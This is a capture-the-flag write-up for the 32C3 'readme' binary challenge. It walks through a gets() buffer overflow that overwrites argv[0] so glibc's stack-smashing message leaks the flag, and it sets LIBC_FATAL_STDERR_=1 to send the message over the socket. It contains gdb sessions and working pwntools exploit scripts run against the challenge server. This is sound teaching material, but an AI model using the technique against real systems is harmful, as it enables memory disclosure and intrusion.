Abuse the stack smashing protector infoleak vulnerability to leak the flag.

## Challenge Description

#### Points

200

#### Description

```
Can you read the flag?

nc 136.243.194.62 1024
```

## Solution

Let's run the binary locally first:

```shell
$ ./readme.bin
Hello!
What's your name? amon
Nice to meet you, amon.
Please overwrite the flag: AAAA
Thank you, bye!
```

Looks like we enter input in two places:

1. When it asks for your name.
2. When it asks you to overwrite the flag.

Let's take a look at what's going on under the hood:

```shell
00000000004007e1         mov        esi, 0x400934  ; "Hello!\\nWhat's your name? "
00000000004007e6         mov        edi, 0x1
00000000004007eb         push       rbx
00000000004007ec         sub        rsp, 0x118
00000000004007f3         mov        rax, qword [fs:0x28]
00000000004007fc         mov        qword [ss:rsp+var_20], rax
0000000000400804         xor        eax, eax
0000000000400806         call       j___printf_chk
000000000040080b         mov        rdi, rsp
000000000040080e         call       j__IO_gets
0000000000400813         test       rax, rax
0000000000400816         je         0x40089f
```

For the name prompt, the standard 'gets()' is used. This means we can use the
good ol' buffer overflow right? Well, not quite.

```shell
$ ./readme.bin
Hello!
What's your name? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Please overwrite the flag: A
Thank you, bye!
*** stack smashing detected ***: ./readme.bin terminated
Aborted (core dumped)
```

If we check what protections are enabled in the binary, we see that the stack canary is present:

```shell
gdb-peda$ checksec
CANARY    : ENABLED
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : disabled
RELRO     : disabled
```

However, notice that the line `*** stack smashing detected ***` appears. Sounds
suspiciously like a Stack Smashing Protection Infoleak vulnerability. What we
have to do is overwrite the arg[0] pointer to point to the flag to leak it. Now,
if we look at the binary the flag is actually included in it.

![1]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/readme/1.png){: .align-center}

However, it's not that easy since the flag is overwritten in the second prompt.
What the overwrite does is read character by character from the user up to 20
characters or a newline into the flag buffer. If it encounters a newline, it
fills the rest of flag buffer with null bytes.

![2]({{ site.url }}{{ site.baseurl }}/assets/images/32c3/readme/2.png){: .align-center}

So. that buffer is overwritten, but is the flag still present in memory? The
answer is yes, exactly why, I am not sure. It's probably something to do with
ELF mapping and hopefully someone puts up a writeup that explains. I found the
other reference through PEDA:

```shell
gdb-peda$ find 32C3
Searching for '32C3' in: None ranges
Found 2 results, display max 2 items:
readme.bin : 0x400d20 ("32C3_TheServerHasTheFlagHere...")
readme.bin : 0x600d20 ("32C3_TheServerHasTheFlagHere...")
```

Now, the 0x600d20 buffer gets overwritten but the 0x400d20 one doesn't so we'll
use that in our exploit. Next, we need to determine the location of the argv[0]
pointer.

```shell
gdb-peda$ find /home
Searching for '/home' in: None ranges
Found 7 results, display max 7 items:
[stack] : 0x7fffffffe234 ("/home/amon/ctf/32c3/readme/readme/readme.bin")
[stack] : 0x7fffffffeb21 ("/home/amon/.composer/vendor/bin")
[stack] : 0x7fffffffebd6 ("/home/amon/ctf/32c3/readme/readme")
[stack] : 0x7fffffffed49 ("/home/amon")
[stack] : 0x7fffffffef4a ("/home/amon/.composer")
[stack] : 0x7fffffffefa0 ("/home/amon/.Xauthority")
[stack] : 0x7fffffffefcb ("/home/amon/ctf/32c3/readme/readme/readme.bin")
gdb-peda$ find 0x7fffffffe234
Searching for '0x7fffffffe234' in: None ranges
Found 2 results, display max 2 items:
   libc : 0x7ffff7dd44b8 --> 0x7fffffffe234 ("/home/amon/ctf/32c3/readme/readme/readme.bin")
[stack] : 0x7fffffffde88 --> 0x7fffffffe234 ("/home/amon/ctf/32c3/readme/readme/readme.bin")
gdb-peda$ print $rsp
$1 = (void *) 0x7fffffffdc70
gdb-peda$ print 0x7fffffffde88-0x7fffffffdc70
$2 = 0x218
```

So, the offset to the pointer is 0x218 (or 536 bytes) from the stack pointer.
Let's test it out. Here is the script to do so:

```python
from pwn import *

context.log_level = "debug"

p = process("./readme.bin")
p.sendline("A"*536 + p64(0x400d20))
p.sendline("placeholder")

p.recvall()
```

Running the script with debug enabled:

```shell
$ python firsttest.py
[+] Started program './readme.bin'
[DEBUG] ...with arguments './readme.bin'
[DEBUG] Sent 0x221 bytes:

    '@.\n'
    'Please overwrite the flag: Thank you, bye!\n'
[*] Program './readme.bin' stopped with exit code -6
```

Notice that the flag does get printed but it does not come through the pipe.
Instead, it is printed on the current terminal. This means that we need to do
something else to exfiltrate that error message over the network when we attack
the remote server. If we [look
online](http://stackoverflow.com/questions/4290336/how-to-redirect-runtime-errors-to-stderr),
we can find that there is an environment variable we can set to get that message
sent over stderr. But how can we do this? If we look closer at the stack layout:

```shell
gdb-peda$ x/16xg 0x7fffffffde88
0x7fffffffde88:    0x00007fffffffe234    0x0000000000000000
0x7fffffffde98:    0x00007fffffffe261    0x00007fffffffe276
0x7fffffffdea8:    0x00007fffffffe281    0x00007fffffffe293
0x7fffffffdeb8:    0x00007fffffffe2aa    0x00007fffffffe2c0
0x7fffffffdec8:    0x00007fffffffe2d8    0x00007fffffffe308
0x7fffffffded8:    0x00007fffffffe317    0x00007fffffffe327
0x7fffffffdee8:    0x00007fffffffe338    0x00007fffffffe34c
0x7fffffffdef8:    0x00007fffffffe363    0x00007fffffffe375
gdb-peda$ x/s 0x00007fffffffe234
0x7fffffffe234:    "/home/amon/ctf/32c3/readme/readme/readme.bin"
gdb-peda$ x/s 0x00007fffffffe261
0x7fffffffe261:    "LC_PAPER=en_SG.UTF-8"
gdb-peda$ x/s 0x00007fffffffe276
0x7fffffffe276: "XDG_VTNR=7"
```

Notice that after argv, there is a null pointer and then an array of pointers to
strings in the environment. We can overwrite one of the pointers with the string
`LIBC_FATAL_STDERR_=1`. Where do we put this string? The old flag buffer of
course! It's there for us to write to. So our final exploit:

```python
from pwn import *

p = remote("136.243.194.62", 1024)
p.sendline("A"*0x218 + p64(0x400d20) + p64(0) + p64(0x600D20))
p.sendline("LIBC_FATAL_STDERR_=1")

print p.recvall()
```

Running the exploit to get our flag:

```shell
$ python exploit.py
[+] Opening connection to 136.243.194.62 on port 1024: Done
[+] Recieving all data: Done (701B)
[*] Closed connection to 136.243.194.62 port 1024
Hello!
What's your name? Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA@.
Please overwrite the flag: Thank you, bye!
